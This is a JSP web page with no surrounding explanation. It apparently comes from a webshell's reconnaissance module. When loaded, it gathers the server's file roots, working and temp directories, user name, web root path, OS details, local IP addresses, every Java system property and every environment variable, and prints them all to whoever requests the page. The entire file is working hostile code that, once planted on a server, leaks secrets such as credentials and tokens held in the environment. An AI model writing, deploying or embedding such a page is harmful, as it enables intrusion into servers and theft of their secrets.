<%@ page pageEncoding="UTF-8" %>
<%@ page import="java.io.File" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.net.NetworkInterface" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.util.*" %>
<%!
    Object servletRequest;
    Object servletContext;
    Object httpSession;

    public byte[] getBasicsInfo() {
        try {
            Enumeration keys = System.getProperties().keys();
            String basicsInfo = new String();
            basicsInfo = basicsInfo + "FileRoot : " + this.listFileRoot() + "\n";
            basicsInfo = basicsInfo + "CurrentDir : " + (new File("")).getAbsoluteFile() + "/" + "\n";
            basicsInfo = basicsInfo + "CurrentUser : " + System.getProperty("user.name") + "\n";
            basicsInfo = basicsInfo + "ProcessArch : " + System.getProperty("sun.arch.data.model") + "\n";

            try {
                String tmpdir = System.getProperty("java.io.tmpdir");
                char lastChar = tmpdir.charAt(tmpdir.length() - 1);
                if (lastChar != '\\' && lastChar != '/') {
                    tmpdir = tmpdir + File.separator;
                }

                basicsInfo = basicsInfo + "TempDirectory : " + tmpdir + "\n";
            } catch (Exception var7) {
            }

            basicsInfo = basicsInfo + "DocBase : " + this.getDocBase() + "\n";
            basicsInfo = basicsInfo + "RealFile : " + this.getRealPath() + "\n";
            basicsInfo = basicsInfo + "servletRequest : " + (this.servletRequest == null ? "null" + "\n" : String.valueOf(this.servletRequest.hashCode()) + "\n");
            basicsInfo = basicsInfo + "servletContext : " + (this.servletContext == null ? "null" + "\n" : String.valueOf(this.servletContext.hashCode()) + "\n");
            basicsInfo = basicsInfo + "httpSession : " + (this.httpSession == null ? "null" + "\n" : String.valueOf(this.httpSession.hashCode()) + "\n");

            try {
                basicsInfo = basicsInfo + "OsInfo : " + String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch")) + "\n";
            } catch (Exception var6) {
                basicsInfo = basicsInfo + "OsInfo : " + var6.getMessage() + "\n";
            }

            basicsInfo = basicsInfo + "IPList : " + getLocalIPList() + "\n\n";

            while (keys.hasMoreElements()) {
                Object object = keys.nextElement();
                if (object instanceof String) {
                    String key = (String) object;
                    basicsInfo = basicsInfo + key + " : " + System.getProperty(key) + "\n";
                }
            }
            basicsInfo = basicsInfo + "\n";
            Map envMap = this.getEnv();
            String key;
            if (envMap != null) {
                for (Iterator iterator = envMap.keySet().iterator(); iterator.hasNext(); basicsInfo = basicsInfo + key + " : " + envMap.get(key) + "\n") {
                    key = (String) iterator.next();
                }
            }

            return basicsInfo.getBytes();
        } catch (Exception var8) {
            return var8.getMessage().getBytes();
        }
    }

    public String listFileRoot() {
        File[] files = File.listRoots();
        String buffer = new String();

        for (int i = 0; i < files.length; ++i) {
            buffer = buffer + files[i].getPath();
            buffer = buffer + ";";
        }

        return buffer;
    }

    public String getDocBase() {
        try {
            return this.getRealPath();
        } catch (Exception var2) {
            return var2.getMessage();
        }
    }

    public String getRealPath() {
        try {
            if (this.servletContext != null) {
                Class var10001 = this.servletContext.getClass();
                Class[] var10003 = new Class[1];
                Class class$2 = null;
                Class var10006 = class$2;
                if (var10006 == null) {
                    try {
                        var10006 = Class.forName("java.lang.String");
                    } catch (ClassNotFoundException var3) {
                        throw new NoClassDefFoundError(var3.getMessage());
                    }

                    class$2 = var10006;
                }

                var10003[0] = var10006;
                Method getRealPathMethod = this.getMethodByClass(var10001, "getRealPath", var10003);
                if (getRealPathMethod != null) {
                    Object retObject = getRealPathMethod.invoke(this.servletContext, "/");
                    return retObject != null ? retObject.toString() : "Null";
                } else {
                    return "no method getRealPathMethod";
                }
            } else {
                return "servletContext is Null";
            }
        } catch (Exception var4) {
            return var4.getMessage();
        }
    }

    public static String getLocalIPList() {
        ArrayList ipList = new ArrayList();

        try {
            Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();

            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = (NetworkInterface) networkInterfaces.nextElement();
                Enumeration inetAddresses = networkInterface.getInetAddresses();

                while (inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = (InetAddress) inetAddresses.nextElement();
                    if (inetAddress != null) {
                        String ip = inetAddress.getHostAddress();
                        ipList.add(ip);
                    }
                }
            }
        } catch (Exception var6) {
        }

        return Arrays.toString(ipList.toArray());
    }

    public Map getEnv() {
        try {
            int jreVersion = Integer.parseInt(System.getProperty("java.version").substring(2, 3));
            if (jreVersion >= 5) {
                try {
                    Class class$6 = null;

                    Class var10000 = class$6;
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("java.lang.System");
                        } catch (ClassNotFoundException var4) {
                            throw new NoClassDefFoundError(var4.getMessage());
                        }

                        class$6 = var10000;
                    }

                    Method method = var10000.getMethod("getenv");
                    if (method != null) {
                        var10000 = method.getReturnType();
                        Class class$7 = null;
                        Class var10001 = class$7;
                        if (var10001 == null) {
                            try {
                                var10001 = Class.forName("java.util.Map");
                            } catch (ClassNotFoundException var3) {
                                throw new NoClassDefFoundError(var3.getMessage());
                            }

                            class$7 = var10001;
                        }

                        if (var10000.isAssignableFrom(var10001)) {
                            return (Map) method.invoke((Object) null, (Object[]) null);
                        }
                    }

                    return null;
                } catch (Exception var5) {
                    return null;
                }
            } else {
                return null;
            }
        } catch (Exception var6) {
            return null;
        }
    }

    Method getMethodByClass(Class cs, String methodName, Class[] parameters) {
        Method method = null;

        while (cs != null) {
            try {
                method = cs.getDeclaredMethod(methodName, parameters);
                method.setAccessible(true);
                cs = null;
            } catch (Exception var6) {
                cs = cs.getSuperclass();
            }
        }

        return method;
    }
%>


<%
    byte[] getInfo = getBasicsInfo();
    out.println("<pre>");
    out.println(new String(getInfo));
    out.println("</pre>");
%>
